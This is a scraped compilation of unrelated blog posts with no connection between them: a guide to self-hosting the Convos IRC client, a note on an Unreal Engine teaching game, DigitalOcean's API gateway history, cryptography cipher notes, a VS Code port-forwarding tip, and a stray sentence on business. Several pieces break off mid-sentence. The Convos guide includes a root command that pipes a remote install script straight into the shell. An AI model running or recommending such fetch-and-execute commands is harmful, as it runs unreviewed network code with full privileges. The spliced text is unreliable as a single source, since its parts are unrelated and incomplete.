<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://serhack.me/images/convos/convos.png" alt="The IRC Client: Convos"></p><p>Throughout 2020, in large part due to the lockdown, many people have started to become familiar with internal communication tools. Microsoft Teams, Slack, Telegram, Mattermost, and a few others are the most widely used and recognizable of these tools, but there still seems to be some people using Internet Relay Chat (IRC) ― one of the first online messaging services.</p><p>Many of the widely used international communication tools have been inspired by IRC, which is gradually falling into disuse due to the modern UI and UX and additional features being offered by these more well-known messaging applications.</p><p>Despite IRC being considered archaic, it is still being used today as a meeting place for many online communities. For example, people who are nostalgic for the early days of the Internet and users of, and contributors to, open-source software projects make IRC a place for discussion ― where it is not the identity that defines who you are, but the content.</p><p>In this article, I will illustrate what IRC is and share with you a product that greatly enhances the IRC protocol by adding features that are common to modern messaging applications. If you are searching for a convenient, self-hosted solution to connect to IRC, then this article is for you.</p><p>In the following paragraphs, we will discuss:</p><ul><li>What the IRC communication protocol is;</li><li>Getting a persistent, always-online chat on IRC;</li><li>Convos, an alternative to IRCCloud and its features;</li><li>The installation of Convos on Debian/Ubuntu; and</li><li>Convos configuration.</li></ul><h2 id="the-irc-communication-protocol">The IRC Communication Protocol</h2><p>IRC is a service that facilitates online communication via messages based on the “client-server” model. In a more technical and precise way, IRC can be considered a network protocol (at the application level) that uses a network composed of servers to easily send messages to network participants.</p><p>Developed in 1988 by Jarkko Oikkarinen, a Finnish student who wanted to create a communication system that would enable real time discussions for a network at his university, IRC quickly expanded to the point where more than 200,000 users were connected every day.</p><p>To start exchanging messages, the user must first connect to the IRC network via a client (e.g., <a href="https://www.pidgin.im/">Pidgin</a>, mIRC), which then connects to the server closest to the user in order to ensure high-speed performance. There are several networks, such as <a href="https://freenode.net/">Freenode</a>, <a href="https://www.swiftirc.net/">Swift IRC</a>, <a href="http://www.ircnet.org/">IRCNet</a>, and <a href="https://www.quakenet.org/">QuakeNet</a>.</p><p>Within IRC, you log in with a nickname (ASCII characters). This allows you to be recognized by the network to which you have connected. To initial a conversation, there are two different ways: start <strong>a private chat</strong> with another user (query) or connect to a <strong>channel</strong>.</p><p>A channel is a dedicated place to chat with a group of users, without writing to each one separately. It might sound strange nowadays, but in the late 1980s and early 1990s, this was viewed as revolutionary and a game changer with regard to how people connected over the Internet. A channel is typically administered by users, called operators, with special privileges and the ability to turn people away and invite them, make the channel private (invisible to the network), set a password, and much more.</p><p>From a technical point of view, an IRC network, currently described by the standard <a href="http://www.faqs.org/rfc/rfc1459.txt">RFC 1459</a>, is composed of several nodes maintained by a centralized entity. When a user with a special client connects to one of the servers, the whole network must be informed about the presence of this client, replicating across all servers the following: nickname, name of the host from which the client has access to the Internet, and the name of the server to which this host is connected.</p><p>Regarding the nickname, you might wonder if another person could impersonate your nickname. The solution to this problem is to register your nickname with a password, so that (in the future) the server can ask you to identify yourself with the password. Here you can read about <a href="https://meta.wikimedia.org/wiki/IRC/Instructions">How to register your nickname on Freenode</a>.</p><p>As alluded to above, from a historical point of view, IRC represents a consolidated communication protocol that is still used today as a discussion environment for people who are nostalgic for the early days of the Internet and users of, and contributors to, open-source software projects. In a way, this has influenced the basic UI and UX of IRC. Today, this appreciation has gone well beyond these users, as IRC has inspired our modern day messaging applications. As an example, Slack is a sexier version of IRC ― dressed up with better UI and UX and having a few modernized features. At their core, though, IRC and today’s messaging applications are no different, as groups are the channels, queries are the private chats, and operators are the administrators.</p><p>If you would like to discover all the commands to better manage your own channel, I suggest you to read <a href="https://en.wikipedia.org/wiki/List_of_Internet_Relay_Chat_commands">the list of commands available on IRC</a>.</p><p>For a long time, IRC has been a gathering place for many communities, including Firefox, Bitcoin, Gnome, and many others. IRC has also been the site of many historic “jokes'' on the Internet. It would be remiss of me not to mention some of these most notable moments: <a href="http://bash.org/?244321">Hunter2</a>, <a href="http://bash.org/?5273">the guy who lost a device in his apartment</a>, and the timeless <a href="http://bash.org/?400459">“does anyone speak python here?"</a>.</p><figure><img src="https://imgs.xkcd.com/comics/team_chat.png"><figcaption><h4>IRC will never die (gently provided by XKCD)</h4></figcaption></figure><p>Arguably the biggest disadvantage of IRC is that you cannot always be connected to a specific server, unless you leave the client on all the time. Unlike normal messaging clients, you will not receive messages if you are not present on the IRC network. In fact, the remote nodes of IRC do not store any messages!</p><p>One of the solutions for this problem is to buy a <a href="https://en.wikipedia.org/wiki/Virtual_private_server">VPS</a> and manage the connection to IRC via a text client with a command line interface. However, this can be inconvenient on mobile devices and, specifically, for a person unfamiliar with the command line. To get around this problem, there is a free self-hosted alternative called Convos that allows you to connect via a web interface to IRC, but that’s not all!</p><h2 id="convoschat-the-solution-to-always-being-connected">Convos.chat: The Solution to Always Being Connected</h2><p><a href="https://convos.chat/">Convos</a> is an open-source, self-hosted client for connecting to IRC maintained by <a href="https://thorsen.pm/">Jan Henning Thorsen</a> and <a href="https://marcus.means.no/">Marcus</a>. The backend was developed with <a href="https://mojolicious.org/">Mojolicious</a>, a Perl framework, while the front-end used the Javascript framework <a href="https://svelte.dev/">Svelte</a>.</p><p>Developed in 2014, Convos has evolved into a very interesting project, despite being maintained by only one person. Among its main features, we find the persistent IRC connection that eliminates the risk of missing some important discussions! The user is connected as long as the Convos daemon is active and each message is stored in a log accessible only to the owner of the server.</p><p>Convos is one of the simplest ways to use IRC and it is always online, so initiating and staying in a discussion has never been easier. Its simple interface allows you to send messages on IRC from any device, be it a smartphone or a fridge ― you just need a browser. You can also choose a theme from those available or <a href="https://convos.chat/blog/2020/6/14/create-your-own-theme-detailed-walkthrough">write your own</a>. Another advantage of Convos is its self-hosted nature. There is no centralized third-party server (like with <a href="https://irccloud.com/">IRCCloud</a>) that stores your messages. With Convos, no one besides you will see your IRC messages and logs.</p><figure><img src="https://serhack.me/images/convos/screenshot.jpg"><figcaption><h4>Convos User Interface</h4></figcaption></figure><p>If you need to upload a file, but do not want to share it with third parties, Convos allows you to upload a file of any extension to your server. Drag and drop the file and Convos will do the rest, creating a unique link for you to share in order to access the file. Want to delete it? You can do it without any problem!</p><p><img src="https://serhack.me/images/convos/drag_and_drop.gif" alt="Drag and Drop per Convos"></p><p>For text files, it gets even better. All messages that will have more than four “line breaks” will be uploaded to a personalized pastebin.</p><p>As we are all well aware, in 2020, having an <a href="https://unicode.org/emoji/charts/full-emoji-list.html">Emoji</a> available is a must! Just type <code>:emoji_name</code> to see the list of emojis available on Convos. Note that all <a href="https://unicode.org/">Unicode</a> characters are also compatible, so across smartphones there will be no problems. You can also add links and make <strong>bold</strong> and/or <em>italicize</em> your posts with <a href="https://www.markdownguide.org/">Markdown</a>.</p><p>Given that IRCCloud is a service (with similar features) that is both <strong>centralized</strong> and <strong>expensive</strong>, <a href="https://convos.chat/">Convos</a> is the leading free alternative. Over the past few years, IRCCloud’s infrastructure has suffered several periods of downtime, which has impacted many (if not all) its users. Unlike IRCCloud, the expenses and stability of running a private server for Convos is more cost-efficient and reliable, especially when compared to the pricing model (per user/per month) and the fragile nature of the IRCCloud infrastructure.</p><h3 id="how-to-start-chatting-with-convos">How to Start Chatting with Convos</h3><p>Installation and configuration of Convos is very simple and does not require any special knowledge of shell scripting. The developers have prepared a very convenient way to run script, so that you will be able to install the Web client quickly.</p><div><pre><code data-lang="bash">root@nodo#: curl https://convos.chat/install.sh | sh -</code></pre></div><p>Here is the <a href="https://convos.chat/install.sh">Script code</a>, if you want to view it. If the script did not show any problems, we can proceed by starting the Convos daemon:</p><div><pre><code data-lang="bash">root@nodo#: ./convos/script/convos daemon</code></pre></div><p>Launch your browser and enter <code>http://localhost:3000</code> to start chatting. There are no additional steps. You only have to choose the IRC network (e.g. Freenode) and Convos will do the rest!</p><p>Since you will be the first user, by default you will be set up as the Convos administrator. This will allow you to manage users, reset passwords as needed or create new ones, and set some <a href="https://convos.chat/doc/config#global-config-settings">global environment variables</a> as the default Convos connection.</p><p>You can change the listening port or IP address via the <a href="https://convos.chat/doc/config#listen"><code>--listen</code></a> flag; although, it is strongly recommended to run Convos behind a proxy server.</p><p>If you want to run Convos through a proxy server, I recommend you read the guide <a href="https://convos.chat/doc/reverse-proxy">“How to Run Convos Behind Your Favourite Server”</a>. A reverse proxy is a particular application that acts as an intermediary, in this case, between the client (the user) and the Convos daemon. It is useful if you want to have features such as SSL management, load balancing, compression, and …</p></div></div>

<p>The game was built with a wide set of features to cover a variety of useful coding concepts to students including AI, multiplayer programming, save games, async asset loading, etc. Check out the non-exhaustive list of features below, I’m sure there is more that I forgot to include or that will drip in at a later time.</p>
<p>Those interested in a GAS (<a href="https://docs.unrealengine.com/en-US/InteractiveExperiences/GameplayAbilitySystem/index.html" target="_blank" rel="noreferrer noopener">Gameplay Ability System</a>) style design might be keen to check out how we handled Abilities (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SAction.h" target="_blank" rel="noreferrer noopener">Action.h</a>) and Buffs/Debuffs (<a href="https://github.com/tomlooman/ActionRoguelike/blob/master/Source/ActionRoguelike/Public/SActionEffect.h" target="_blank" rel="noreferrer noopener">ActionEffect.h</a>) as this shares many similarities with GAS design, albeit its much simpler.</p>
<p>At the time of writing, there isn’t a whole lot that makes this a real ‘roguelike’ with things like permadeath or proper RNG. But, I hope to extend this project later on with more relevant features to have a proper game loop to earn the name ‘Action Roguelike’.</p>

<h2>Features</h2>
<p>Below I’ve listed some of the more relevant features included in the project. I think these code samples can be invaluable in getting an idea on how to use them in the Unreal Engine eco-system. Especially things like Asset Manager have limited public examples, which is one of the benefits of this open-source project.</p>

<h2>What’s Next?</h2>
<p>There is still a decent chunk of features I would like to add, including adding a proper game loop, items/abilities, Steamworks, etc. Whether these will actually see the light of day depends on many factors – including the final shape of the existing course recordings.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post">
	<p>TL;DR: this is mostly a text version of a presentation I’ve done a couple times (<a href="https://www.youtube.com/watch?v=S8OQfB6JSf8">English</a> or <a href="https://www.youtube.com/watch?v=Ld8UFU-DB1U">Portuguese</a>) on the history of building DigitalOcean’s API gateway. How we made it easier for folks to build new microservices instead of continuing to add code to our monoliths, the successes, failures and lessons learned.</p>

<p>First, where were we?</p>

<p>DigitalOcean had 3 monoliths back in 2016 when we started (all 3 are still alive today, albeit much smaller than they were before). Why were there 3? There is a shared library that contains most of the logic that all 3 applications use, so in reality we had one “monolith library” that was reused at all 3, most logic changes were made into this library and then it would be upgraded at every single app separately. The library still exists today and continues to be updated every once in a while.</p>

<p>As you can imagine, as more and more changes started to happen, with the company growing incredibly fast both in terms of business and hiring, this wasn’t ideal. Many times someone would change this core library, deploy one of the apps (the control pane you see when you sign in), but not the JSON API. So you could end up with a new feature visible at the control panel but not at the API. There would always be a time when this library version wouldn’t match across all applications, as we were not deploying them all at once every single time, so there was always space for there to be a mismatch of features available.</p>

<p>This also meant that the test suite was growing by leaps and bounds, getting slower, making running the test suite and deployments a pain. There was growing interest in doing something about this, but we couldn’t just migrate everything out. There was also a lot of interest in NOT doing Ruby anymore. There was a growing body of Golang code all over the place and people wanted to use it for their new services instead of building it all inside the old monoliths.</p>

<p>There was a catch here though, how could they possibly do all the things the Rails apps were doing, like authentication, rate limiting, authorization, feature flipping, routing, error handling and all the shared logic, in a new language, without repeating the same thing across all new projects?</p>

<p>We needed something that would be language agnostic and could be run side by side with the existing monoliths. At this point we knew a library ( like Twitter’s Finagle) wasn’t an option. Our solution had to work with the old Ruby code and the new Golang stuff (and JS, maybe Python. It was all up in the air back then). We wouldn’t be able to build a library with all the shared features needed in multiple languages.This is where the API gateway comes in.</p>



<p>The microservices.io patterns list has a great definition for the <a href="https://microservices.io/patterns/apigateway.html">API gateway</a>:</p>

<div><div><pre><code>Implement an API gateway that is the single entry point for all clients. The API gateway handles requests in one of two ways. Some requests are simply proxied/routed to the appropriate service. It handles other requests by fanning out to multiple services. 
</code></pre></div></div>

<p>It took us multiple meetings and discussions between Joonas Bergius, Nan Zhong, Joe Friedl, me and even Phil Calçado, who was the engineering lead (not sure if this was actually the title but he was the boss), to come to the realization that we were going to build an API gateway.</p>

<p>What came out of the brainstorms:</p>

<ul>
  <li>It was going to be a pure HTTP proxy, no GRPC, GraphQL or other special protocols;</li>
  <li>We would not change request or response bodies, so there wouldn’t be any protocol translation. Applications would be responsible for parsing the input and producing valid outputs, in the format the client was expecting;</li>
  <li>We’d augment the requests and responses with extra information encoded as HTTP headers, including user information, rate limiting details, tracing metadata, features enabled, so all downstream applications would have to do was looking at the headers, not special exchange format.</li>
  <li>Route configuration would be self-service, teams would call a service with their route configuration and the proxy would automatically pick up changes and update it’s routing table. It would perform basic health checking and remove destinations that weren’t reachable, but otherwise would take any request and forward it to the registered services.</li>
  <li>It would also include filters that could be run before or after a request was processed, these filters would include authentication, rate limiting, feature flipping and all the other shared pieces teams would need to be available to build apps out of the monoliths.</li>
</ul>

<p>Does it look a lot like Java’s Servlet API or Ruby’s Rack? Of course, those were the main inspirations for the design. Going for a simple, well known, design would make us move faster as there would be less stuff to do and we could always complicate it in the future. This was one of the best decisions we made and this is still the way it works nowadays.</p>

<p>Why didn’t we pick something that existed? Fair question. There really weren’t many options back then and the ones that did exist did not make it easy to integrate custom code. Our very first challenge was to decrypt and parse Rails sessions to authenticate users, and there was plenty of complex code to decrypt, unmarshal (from Ruby’s serialization format) and make sense of session data.</p>

<p>Nginx, that was one of the options when we started, only offered integration through Lua scripts, so we’d have to write this session decrypting and parsing logic in Lua scripts we’d bundle with our custom Nginx install and that did not feel like a great solution. It was hard to test the scripts, no one had any experience with Lua and the whole setup wasn’t robust, these scripts were seen mostly as doing small changes in the request flow, not for building complex logic.</p>

<p>So, we started building our own API gateway in Golang.</p>



<p>Once we had the basic proxy built, we placed it in front of some of the traffic, to make sure it could proxy correctly. The first two “filters” we built were the authentication filters, for Rails sessions and OAuth tokens. To roll these out, we started by “doing” the filter work for both monoliths but not acting on them, we’d check if the output we came to in our implementation was the same the monoliths decided on and if the response was also the same; if our own service said a request should be denied but the monoliths responded with an OK or the other way around, we’d log that and work on figuring out why it didn’t work.</p>

<p>As we built these filters, another pattern emerged, instead of having all this code inside the API gateway itself, we thought it would be faster to separate the code into a separate service. The initial goal was mostly to make it reusable by other teams if needed and make it easier for us to deploy smaller changes as deploying the gateway itself was a complicated and slow process (due to the way our internal K8s clusters networking was setup back then, we couldn’t run the gateway on them, so it ran on droplets). After that, almost all filters were just glue code to call an external service that actually knew how to get the job done.</p>

<p><img src="https://mauricio.github.io/images/api-gateway.png" alt="API Gateway simple architecture diagram" title="API Gateway simple architecture diagram"></p>

<p>While it was a response to environmental constraints and not really something we planned, this design made the gateway itself smaller and more reliable. A lot of the logic would live in these microservices instead of the gateway and updates to them had a much smaller blast radius when something went awry.</p>

<p><a href="https://twitter.com/nanzhong">@nanzhong</a> finally switched it to serve all traffic sometime in November 2016, a couple months after our announcement, including full support for authentication with the Rails session and OAuth tokens.</p>



<p>So far we had only done work internally. We weren’t exposing any of this to other teams yet, as we wanted to verify it was all behaving as expected before letting people register their services. The first integrations were bumpy and the experience for the teams we were integrating with was hard.</p>

<p>We lacked documentation and good examples. Teams had to come to us frequently to make sure their services were really up, their configurations were valid, how routing would work (what options are available? Can I use wildcards? Can I use URL parameters? In what order are routes matched?) and how they should integrate route registration into their workflows. This led to a lot of manual labor on our end helping people do stuff they could be doing themselves had we done the work to make it easier to onboard them. The lesson here was clear, if you’re working on infrastructure, make sure you can stay out of the way when people are doing their work, you want them to work on their time and not be an impediment for their work.</p>

<p>We also lacked best practices for what the backend services should look like. Multiple teams were being formed of new developers that didn’t have a lot of experience with building applications with Golang and we did not provide guidance here on how they should set up their applications and what configurations were important.</p>

<p>One recurrent issue we had at the beginning was that <a href="https://golang.org/pkg/net/http/#Server">Golang’s http.Server</a> class assumes all timeouts are infinite unless you set them (ReadTimeout, ReadHeaderTimeout, WriteTimeout, WriteIdleTimeout) and this would lead to services getting a broken connection from the client (the API gateway) and wouldn’t know what it was until we checked their configs and noticed they just didn’t set a value (while we did have a max timeout for all requests on our end, so we’d close a connection that took too long).</p>

<p>Providing better guidance here for basic options and configurations that teams should be doing in all their apps would have saved a lot of time and effort for everyone.</p>

<p>Next, when registering routes, teams would talk directly to the key-value store we were using to store the routing table (Consul) and as you can imagine this wasn’t ideal. There was very little validation in place and it was super simple for people to register routes that wouldn’t load or that wouldn’t really route anything due to being incomplete. …</p></div></div>

		<p>I thought I should make a running post on cryptography ciphers (algorithms) and such. For instance, in my <a title="Notes on TLS/SSL, RSA, DSA, EDH, ECDHE, and so on …" href="http://rakhesh.com/infrastructure/notes-on-tlsssl-rsa-dsa-edh-ecdhe-and-so-on/">previous post</a> I mentioned AES, EDH, etc. but that’s just the tip of the ice-berg as there are so many&nbsp;algorithms each&nbsp;suited for different tasks. As I come across these I’ll add them to this post as a quick reference to myself.&nbsp;</p>
<h2>Symmetric key&nbsp;algorithms&nbsp;(Private&nbsp;key cryptography)</h2>
<p>Both parties share a private key (kept secret between them).</p>
<p>Symmetric key algorithms are what you use for encryption. F0r example: encryption of traffic between a server and client, as well as&nbsp;encryption of&nbsp;data on a disk.&nbsp;</p>
<ul>
<li>DES – Data Encryption Standard – designed at IBM
<ul>
<li>DES is a standard. The actual algorithm used is also called DES or sometimes DEA (Digital Encryption Algorithm).&nbsp;</li>
<li>DES is now considered insecure (mainly due to a small key size of 56-bits).&nbsp;</li>
<li>Triple DES (3DES) applies the DES algorithm&nbsp;thrice and thus has better practical security. It has 3 keys of 56-bits each (applied to each pass of DES/ DEA).&nbsp;</li>
<li>DES-X is another variant.&nbsp;</li>
<li>DES is a&nbsp;<a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block cipher</a>.</li>
</ul>
</li>
<li>IDEA – International Data Encryption Algorithm
<ul>
<li>Considered to be a good and secure algorithm.&nbsp;</li>
<li>Patented but free for non-commercial use.&nbsp;</li>
<li>IDEA&nbsp;is a&nbsp;<a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block cipher</a>.</li>
</ul>
</li>
<li>AES – Advanced Encryption Standard – is the successor to DES
<ul>
<li>AES is based on the&nbsp;Rijndael cipher. There was a competition to choose the cipher that will become the AES. The&nbsp;Rijndael cipher won the competition. However, <a href="http://blogs.msdn.com/b/shawnfa/archive/2006/10/09/the-differences-between-rijndael-and-aes.aspx" target="_blank">there are some differences</a> between&nbsp;Rijndael and its implementation in AES.&nbsp;</li>
<li>Most CPUs now include hardware AES support making it very fast.</li>
<li>Supported&nbsp;by TrueCrypt, SSH.&nbsp;</li>
<li>AES and Rjindael are <a href="https://en.wikipedia.org/wiki/Block_cipher" target="_blank">block ciphers</a>.&nbsp;</li>
<li>AES can operate in <a href="http://stackoverflow.com/questions/1220751/how-to-choose-an-aes-encryption-mode-cbc-ecb-ctr-ocb-cfb" target="_blank">many modes</a>.
<ul>
<li>AES-GCM (AES operating in Galois/Counter Mode (GCM)) is <a href="https://tools.ietf.org/html/rfc5288" target="_blank">preferred</a>&nbsp;(check <a href="http://blog.cloudflare.com/staying-on-top-of-tls-attacks/" target="_blank">this blog post</a> too). It is fast and secure and works similar to stream ciphers. Can achieve high speeds on low hardware too. Only supported on TLS 1.2 and above.&nbsp;</li>
<li>AES-<a href="https://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Cipher-block_chaining_.28CBC.29" target="_blank">CBC</a> is what older clients commonly use. AES-CBC mode is susceptible to attacks such as <a href="http://blog.cloudflare.com/new-ssl-vulnerabilities-cloudflare-users-prot" target="_blank">Lucky13</a> and <a href="http://blog.cloudflare.com/taming-beast-better-ssl-now-available-across" target="_blank">BEAST</a>.</li>
<li>See <a href="http://stackoverflow.com/a/22958889/2610230" target="_blank">this answer</a> for an excellent overview of the various modes.&nbsp;</li>

<li>RC4 – Rivest Cipher 4, or Ron’s Code 4 – also known as ARC4 or ARCFOUR (Alleged RC4).
<ul>
<li><a href="http://www.docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm" target="_blank">Used to be</a> an unpatented trade-secret for&nbsp;RSA Data Security Inc (RSADSI). Then someone posted the source code online, anonymously, and it got into the public domain.&nbsp;</li>
<li>Very fast, but less studied than other algorithms.&nbsp;
<ul>
<li>RC4 is good if the key is never reused. Then its considered secure by many.&nbsp;</li>
<li>In practice RC4 is not recommended. TLS 1.1 and above&nbsp;<a href="https://en.wikipedia.org/wiki/Transport_Layer_Security#Cipher" target="_blank">forbid RC4</a>&nbsp;(also <a href="https://tools.ietf.org/html/draft-ietf-tls-prohibiting-rc4-01" target="_blank">this RFC</a>). <a href="http://blog.cloudflare.com/killing-rc4-the-long-goodbye/" target="_blank">CloudFlare recommends against it</a>&nbsp;(check <a href="http://blog.cloudflare.com/staying-on-top-of-tls-attacks/" target="_blank">this blog post</a> too). <a href="http://blogs.technet.com/b/srd/archive/2013/11/12/security-advisory-2868725-recommendation-to-disable-rc4.aspx" target="_blank">Microsoft recommends against it</a>. Current recommendations overall are to use TLS 1.2 (which forbids RC4) and use <a href="http://www.heliontech.com/aes_gcm.htm" target="_blank">AES-GCM</a>.</li>
<li>See this <a href="http://blog.cryptographyengineering.com/2013/03/attack-of-week-rc4-is-kind-of-broken-in.html" target="_blank">blog post</a> too.</li>
</ul>
</li>
<li>RC4 is a <a href="https://en.wikipedia.org/wiki/Stream_cipher" target="_blank">stream cipher</a>. It’s the most widely used stream cipher.&nbsp;
<ul>
<li>Recently <a href="http://blog.cryptographyengineering.com/2013/02/attack-of-week-tls-timing-oracles.html" target="_blank">block ciphers were found to have issues</a>&nbsp;(e.g. <a href="http://www.net-security.org/article.php?id=1638" target="_blank">BEAST</a>, <a href="http://blog.cryptographyengineering.com/2013/02/attack-of-week-tls-timing-oracles.html" target="_blank">Lucky13</a>)&nbsp;because of which RC4 rose in importance. Now such attacks are mitigated (use GCM mode for instance) and RC4 is strongly recommended against.&nbsp;</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2>Asymmetric key algorithms (Public key cryptography)</h2>
<p>Each party has&nbsp;a private key (kept secret) and a public key (known to all). These are used in the following way:</p>
<ul>
<li><strong>Public keys are used for encrypting, Private keys are used for decrypting.&nbsp;</strong>
<ul>
<li>For example: to send something encrypted to a party use its public key and send the encrypted data. Since only that party has the corresponding private key, only that party can decrypt it. (No point encrypting it with your private key as anyone can then decrypt with your public key!)</li>
</ul>
</li>
<li><strong>Private keys are used for signing, Public keys are used for verifying.&nbsp;</strong>
<ul>
<li>For example: to digitally sign something, encrypt it with your private key (usually a hash is made and the hash encrypted). Anyone can decrypt this data (or decrypt the hash &amp; data and perform a hash themselves to verify&nbsp;your hash and their hash match) and verify that since it was signed by your private key the data belongs to you.&nbsp;</li>
</ul>
</li>
</ul>
<p>These algorithms are usually used to digitally sign data and/ or exchange a secret key which can be used with a symmetric key algorithm to encrypt further data. They are often not used for encrypting the conversation either because they can’t (DSA, Diffie-Hellman) or because the yield is low and there are speed constraints (RSA). Most of these algorithms make use of&nbsp;hashing functions (see below) for <a href="http://security.stackexchange.com/a/9265" target="_blank">internal purposes</a>.&nbsp;</p>
<ul>
<li>RSA – short for the surnames of its designers&nbsp;Ron Rivest, Adi Shamir and Leonard Adleman
<ul>
<li>Not used to encrypt data directly because of <a href="http://www.paradigm.ac.uk/workbook/metadata/authenticity-signatures.html" target="_blank">speed&nbsp;constraints</a> and also because its yield is small (see <a href="http://security.stackexchange.com/a/9265" target="_blank">this post</a> for a good explanation; also <a href="http://technet.microsoft.com/en-us/library/cc962021.aspx" target="_blank">this TechNet</a> article).
<ul>
<li>Usually RSA is used to&nbsp;share a secret key and then a symmetric key algorithm is used for the actual encryption.&nbsp;</li>
<li>RSA can be used for digital signing but is slower. DSA (see below) is preferred. However, RSA signatures are <a href="http://security.stackexchange.com/a/5105" target="_blank">faster to verify</a>.&nbsp;To sign data <a href="http://www.paradigm.ac.uk/workbook/metadata/authenticity-signatures.html" target="_blank">a hash is made of it and the hash encrypted</a> with the private key. (Note: RSA <em>requires</em> that <a href="http://crypto.stackexchange.com/questions/12768/why-hash-the-message-before-signing-it-digital-signature-with-rsa" target="_blank">a hash be made</a> rather than encrypt the data itself). &nbsp;</li>
<li>RSA does not&nbsp;require the use of any particular hash function.&nbsp;</li>
</ul>
</li>
<li>Public and Private keys are based on two large prime numbers which must be kept secret. RSA’s security is based on the fact that <a href="http://en.wikipedia.org/wiki/Integer_factorization" target="_blank">factorization of large integers</a> is difficult. (The public and private keys are large integers which are&nbsp;derived from&nbsp;the two large prime numbers).</li>
<li>PKCS#1 is a standard for implementing&nbsp;the RSA algorithm. The RSA algorithm can be attacked if certain criteria are met so the PKCS#1 defines things such that these criteria are not met. See <a href="http://rdist.root.org/2009/10/06/why-rsa-encryption-padding-is-critical/" target="_blank">this post</a> for more info.&nbsp;</li>
<li>Was originally patented by the RSA but has since (circa 2000) expired.&nbsp;</li>
<li><a href="http://linux.die.net/man/1/ssh-keygen" target="_blank">SSH v1</a> only uses RSA keys (for identity verification).&nbsp;</li>
</ul>
</li>
<li>DSA – Digital Signature Algorithm – designed by the NSA as part of the Digital Signature Standard (DSS)
<ul>
<li>Used for digital signing. Does not do encryption. (But implementations can do encryption using RSA or ElGamal encryption)&nbsp;</li>
<li>DSA is <a href="http://security.stackexchange.com/a/5105" target="_blank">fast at signing but slow at verifying</a>.&nbsp;
<ul>
<li>It <a href="http://www.paradigm.ac.uk/workbook/metadata/authenticity-signatures.html" target="_blank">mandates the use of SHA hashes</a> when computing digital signatures.&nbsp;</li>
<li>Unlike RSA which makes a hash of the data and then encrypts it to sign the message – and this data plus encrypted hash is what’s used to verify the signature – DSA has a different process. DSA&nbsp;<a href="http://technet.microsoft.com/en-us/library/cc962021.aspx" target="_blank">generates a digital signature composed of two 160-bit numbers</a> directly from the private key and a hash of the data to be signed. The corresponding public key can be used to verify the signature. The verifying is slow.&nbsp;</li>
<li>A note about speed:&nbsp;DSA is faster at signing, slow at verifying. RSA is&nbsp;faster at verifying, slow at signing.&nbsp;The&nbsp;significance of this is different from what you may think. Signing can be used to sign data, it can also be used for authentication. For instance, when using SSH you sign some data with your private&nbsp;key and send to the server. The server verifies the signature and if it&nbsp;succeeds you are authenticated. In such a situation it doesn’t matter that DSA verification is slow because it usually happens on a powerful server. DSA signing, which happens on a relatively slower computer/ phone/ tablet is a much faster process and so less intensive on the processor. In such a&nbsp;scenario DSA is preferred! Remember: <em>where</em> the slow/ fast activity occurs also matters.&nbsp;</li>
</ul>
</li>
<li>DSA can be used <a href="http://security.stackexchange.com/a/5105" target="_blank">only for signing</a>. So DSA&nbsp;has to use something like Diffie-Hellman to generate another key for encrypting&nbsp;the conversation.&nbsp;
<ul>
<li>This is a good thing as it allows for Perfect Forward Secrecy (PFS).&nbsp;
<ul>
<li>Forward Secrecy =&gt; the shared key used for encrypting conversation between two parties is not related to their public/ private key.</li>
<li>Perfect Forward Secrecy =&gt; in addition to the above, the shared keys are generated for each conversation and are independent of each other.&nbsp;</li>
</ul>
</li>
<li>Also, because&nbsp;DSA can be&nbsp;used only for digital signatures and not encryption, it&nbsp;is usually <a href="http://technet.microsoft.com/en-us/library/cc962021.aspx" target="_blank">not subject to export or import restrictions</a>. Therefore it can be used more widely.</li>
</ul>
</li>
<li>Patented but made available&nbsp;royalty free.&nbsp;</li>
<li>DSA’s security is based on&nbsp;the <a href="http://en.wikipedia.org/wiki/Discrete_logarithm" target="_blank">discrete logarithm</a> problem.&nbsp;</li>
<li>Section 3.9.1.2 of <a href="http://www.docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm" target="_blank">this article</a> is worth a read. Since it’s designed by the NSA, DSA has&nbsp;some controversies.&nbsp;</li>
<li><a href="http://linux.die.net/man/1/ssh-keygen" target="_blank">SSH v2</a> can use RSA or DSA&nbsp;keys (for identity verification). It prefers DSA because RSA used to be patent protected. But now that the patents have <a href="http://www.docstore.mik.ua/orelly/networking_2ndEd/ssh/ch03_09.htm" target="_blank">expired RSA is supported</a>.&nbsp;</li>
<li>RSA is supported by all versions of SSL/ TLS.&nbsp;</li>
<li>DSA (and ECDSA) requires random numbers. If the random number generator …</li></ul></li></ul></div></article></div>

<p>I was trying to get a development VM working (Windows host, Linux guest). I’d just binned WSL2 as it was causing me a bit of jip, and had been happily coding all day with Remote SSH into my shiny new Ubuntu VM via VS Code. I was, however, having a few problems. The frontend I was working on was using Auth0 for authentication, and that wasn’t happy on a non-localhost domain, with no HTTPS. Webpack to the rescue… give me a dev cert… done and working. Until the frontend tries to make a request to the backend – blocked due to mixed HTTP/HTTPS.</p>
<p>I was going round the houses finding the best solution for getting a system in place to allow both DNS (host file?… lightweight DNS proxy?!), and SSL termination on the VM (nginx, caddy, traefik?!).</p>
<p>After spending a very long time investigating the latest and greatest, I randomly refreshed an old localhost:8081 tab running in Chrome (the site I was working on was running here) and to my surprise, the whole thing loaded, from the Ubuntu VM. To check I wasn’t crackers I checked the logs there, and it was the VM serving my requests. How?! Whaaaaaattt????!!!!!</p>
<p>I could understand this if I’d had a few gins, but no, maybe tired eyes? After some digging, I discovered that if a program outputs a localhost:port style URL into the terminal in VS Code whilst you are using the Remote SSH feature, and you click it, it will automagically setup a port forward.</p>

<p>What a handy little feature! One worth knowing about for those juxtaposed between Windows and Linux, or just taking advantage of the remote features of VS code. Don’t do what I did and go round the houses, this is a great solution to many problems.</p>

It’s so often the rags to riches, starving artist or the struggling entrepreneur that catches the headlines. Outside the world of start-up mythology however it’s more commonly risk aversion that keeps the world of business ticking over. 

